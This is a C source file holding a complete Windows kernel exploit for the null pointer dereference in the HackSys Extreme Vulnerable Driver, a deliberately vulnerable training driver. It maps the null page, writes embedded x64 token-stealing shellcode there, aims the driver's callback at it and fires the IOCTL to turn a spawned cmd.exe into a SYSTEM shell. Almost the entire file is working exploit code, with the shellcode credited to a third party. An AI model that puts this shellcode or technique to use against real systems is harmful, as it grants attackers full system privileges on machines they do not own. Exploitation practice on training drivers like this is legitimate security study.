#include <Windows.h>
#include <stdio.h>

#define NULLPTR_IOCTL 0x22202B

// Shellcode provided by xpnsec! His blog can be found here: https://blog.xpnsec.com/hevd-null-pointer/
// Replace shellcode+27 with the process ID (PID)
BYTE shellcode[95] = {
	0x50, 0x53, 0x51, 0x56, 0x57, 0x65, 0x48, 0x8b, 0x04, 0x25,
	0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0x10, 0x02, 0x00,
	0x00, 0x81, 0xb8, 0x80, 0x01, 0x00, 0x00, 0x41, 0x41, 0x41,
	0x41, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00,
	0x48, 0x2d, 0x88, 0x01, 0x00, 0x00, 0xeb, 0xe5, 0x48, 0x89,
	0xc3, 0x83, 0xb8, 0x80, 0x01, 0x00, 0x00, 0x04, 0x74, 0x0f,
	0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x2d, 0x88,
	0x01, 0x00, 0x00, 0xeb, 0xe8, 0x48, 0x8b, 0x88, 0x08, 0x02,
	0x00, 0x00, 0x48, 0x89, 0x8b, 0x08, 0x02, 0x00, 0x00, 0x5f,
	0x5e, 0x59, 0x5b, 0x58, 0xc3
};
char unused = 0;

typedef NTSTATUS(*WINAPI ZwAllocateVirtualMemory)(
	_In_    HANDLE    ProcessHandle,
	_Inout_ PVOID* BaseAddress,
	_In_    ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T   RegionSize,
	_In_    ULONG     AllocationType,
	_In_    ULONG     Protect
);

// Q: What is the difference between this exploit and the other null pointer dereference exploit in the GitHub repository?
// A: This exploit will be written without help from writeups, with two exclusions: the typedef ZwAllocateVirtualMemory, and the shellcode.

// Created by Uncodable on 5/7/2021, 3:53 AM EST.
// Exploit finished on 5/8/2021, 4:50 AM EST.
int main(int argc, char** argv)
{
	printf("[>] HackSys Extreme Vulnerable Driver - Null Pointer Dereference Exploit\n[>] - Written by Uncodable\n[>] Lets exploit!\n[*] Attempting to obtain a handle to the HackSys Extreme Vulnerable Driver...\n");

	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to obtain a handle to the vulnerable driver.");
		unused = getchar();
		return 0;
	}
	printf("[+] Obtained a handle to the vulnerable driver. Handle value: 0x%p\n[*] Loading the ntdll.dll library...\n", hDriver);

	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	if (!ntdll)
	{
		printf("[-] Failed to load the ntdll.dll library.");
		unused = getchar();
		return 0;
	}
	printf("[+] Loaded the ntdll.dll library. Address: 0x%p\n[*] Locating the address for the ZwAllocateVirtualMemory function...\n", ntdll);

	ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(ntdll, "ZwAllocateVirtualMemory");
	printf("[+] Found the address for ZwAllocateVirtualMemory. Address: 0x%p\n[*] Allocating the null page...\n", _ZwAllocateVirtualMemory);

	PVOID baseAddress = (PVOID)1;
	SIZE_T regionSize = 4096;
	NTSTATUS result = _ZwAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (result)
	{
		printf("[-] Failed to allocate the null page.");
		unused = getchar();
		return 0;
	}
	printf("[+] Allocated the null page. NTSTATUS result: %d (0x%x)\n[*] Spawning a shell...\n", result, result);

	STARTUPINFOA startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&processInformation, sizeof(processInformation));
	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &processInformation))
	{
		printf("[-] Failed to spawn a shell.");
		CloseHandle(processInformation.hProcess);
		CloseHandle(processInformation.hThread);
		unused = getchar();
		return 0;
	}
	printf("[+] Spawned a shell.\n");
	Sleep(1000);

	DWORD oldProtectionFlags = 0;
	VirtualProtect(&shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtectionFlags);
	printf("[+] Marked shellcode as read+write+execute.\n");

	DWORD pid = processInformation.dwProcessId;
	*(unsigned long*)(shellcode + 27) = pid;
	printf("[+] Set shellcode+27 to the process ID. PID: %d\n", pid);

	unsigned long* newShellcodeAddress = (unsigned long*)0x0000000000000400;
	unsigned long* callbackPointer = (unsigned long*)0x0000000000000008;
	*callbackPointer = newShellcodeAddress;
	printf("[+] Set the callback function of the vulnerable driver at address 0x%p to point towards the shellcode. Shellcode address: 0x%p\n", callbackPointer, newShellcodeAddress);

	memcpy(newShellcodeAddress, &shellcode, sizeof(shellcode));
	printf("[+] Copied the shellcode to address 0x%p.\n[*] Sending the IO control code to the HackSys Extreme Vulnerable Driver...\n", newShellcodeAddress);
	Sleep(250);

	BYTE inBuffer[1024];
	memset(&inBuffer, 'A', sizeof(inBuffer));
	LPVOID outBuffer[1024] = { 0 };
	DWORD bytesReturned = 0;
	DeviceIoControl(hDriver, NULLPTR_IOCTL, inBuffer, sizeof(inBuffer), &outBuffer, sizeof(outBuffer), &bytesReturned, NULL);
	printf("[+] Sent the IO control code to the vulnerable driver.\n[!] Enjoy the SYSTEM shell!\n");
	unused = getchar();

	return 1;
}
